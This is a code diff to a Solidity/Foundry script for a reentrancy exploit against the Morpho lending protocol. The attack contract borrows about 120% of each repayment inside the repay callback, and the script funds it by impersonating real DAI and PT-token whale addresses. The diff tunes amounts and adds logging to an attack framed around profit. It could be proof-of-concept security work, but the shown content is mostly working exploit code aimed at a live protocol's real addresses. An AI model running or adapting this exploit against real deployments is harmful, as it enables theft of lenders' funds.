@@ -81,6 +81,11 @@ contract MorphoAttack is IMorphoRepayCallback {
         // Get market parameters
         MarketParams memory params = morpho.idToMarketParams(marketId);
 
+        // Calculate a safe borrowing amount - at this point we already have 0 borrow shares
+        // So we can borrow based on our full collateral value
+        (,, uint128 collateral) = morpho.position(marketId, address(this));
+        console.log("Collateral position during callback:", uint256(collateral) / 1e18);
+
         // Borrow more than we're repaying - this is where the profit comes from
         uint256 newBorrowAmount = assets * 12 / 10; // 120% of what we're repaying
         console.log("Borrowing in callback:", newBorrowAmount / 1e18, "DAI");
@@ -112,7 +117,7 @@ contract MorphoAttack is IMorphoRepayCallback {
         // Check our position
         (,uint128 borrowShares, uint128 collateral) = morpho.position(marketId, address(this));
         console.log("Collateral position:", uint256(collateral) / 1e18);
-        console.log("Borrow shares:", uint256(borrowShares) / 1e18);
+        console.log("Borrow shares:", uint256(borrowShares));
     }
 }
 
@@ -124,37 +129,29 @@ contract MorphoReentrancyTest is Script {
     address constant LOAN_TOKEN = 0x6B175474E89094C44Da98b954EedeAC495271d0F; // DAI
     bytes32 constant MARKET_ID = 0x5e3e6b1e01c5708055548d82d01db741e37d03b948a7ef9f3d4b962648bcbfa7;
 
-    // Large holders of these tokens
+    // Large holders of these tokens (with correct checksums)
     address constant PT_WHALE = 0x63F4cbBd88033C366507c3F6Edf0AD64C32cb641; // PT holder
     address constant DAI_WHALE = 0xD1668fB5F690C59Ab4B0CAbAd0f8C1617895052B; // DAI holder
 
     function run() external {
-        // Start impersonating PT_WHALE to get PT tokens
+        // Check PT token whale
         vm.startPrank(PT_WHALE);
-
-        // Check how much PT tokens the whale has
         uint256 ptBalance = IERC20(COLLATERAL_TOKEN).balanceOf(PT_WHALE);
         console.log("PT Whale balance:", ptBalance / 1e18, "PT-sUSDE");
 
-        // We'll use 10,000 PT tokens for the attack
-        uint256 collateralAmount = 10_000 * 1e18;
+        // We'll use a smaller amount to ensure it works
+        uint256 collateralAmount = 1_000 * 1e18; // 1,000 PT tokens
         require(ptBalance >= collateralAmount, "Not enough PT tokens");
-
-        // Stop impersonating
         vm.stopPrank();
 
-        // Start impersonating DAI_WHALE to get DAI
+        // Check DAI whale
         vm.startPrank(DAI_WHALE);
-
-        // Check how much DAI the whale has
         uint256 daiBalance = IERC20(LOAN_TOKEN).balanceOf(DAI_WHALE);
         console.log("DAI Whale balance:", daiBalance / 1e18, "DAI");
 
-        // We'll use 1,000 DAI for the attack (for repaying during the attack)
-        uint256 initialDai = 1_000 * 1e18;
+        // We'll use a smaller amount for initial liquidity
+        uint256 initialDai = 500 * 1e18; // 500 DAI
         require(daiBalance >= initialDai, "Not enough DAI");
-
-        // Stop impersonating
         vm.stopPrank();
 
         // Now execute the full attack
@@ -173,7 +170,7 @@ contract MorphoReentrancyTest is Script {
 
         console.log("Attack contract deployed at:", address(attacker));
 
-        // Stop broadcasting for now
+        // Stop broadcasting for non-transaction operations
         vm.stopBroadcast();
 
         // Transfer tokens to the attacker contract
@@ -196,12 +193,12 @@ contract MorphoReentrancyTest is Script {
 
         // Setup the position - collateral and borrowing
         console.log("\n--- SETTING UP POSITION ---");
-        uint256 borrowAmount = 8_000 * 1e18; // Borrow 8,000 DAI (80% of collateral)
+        uint256 borrowAmount = 700 * 1e18; // Borrow 700 DAI (70% of collateral)
         attacker.setupPosition(collateralAmount, borrowAmount);
 
         // Now execute the attack
         console.log("\n--- EXECUTING REENTRANCY ATTACK ---");
-        uint256 repayAmount = 5_000 * 1e18; // Repay 5,000 DAI
+        uint256 repayAmount = 400 * 1e18; // Repay 400 DAI
         attacker.executeAttack(repayAmount);
 
         // Stop broadcasting
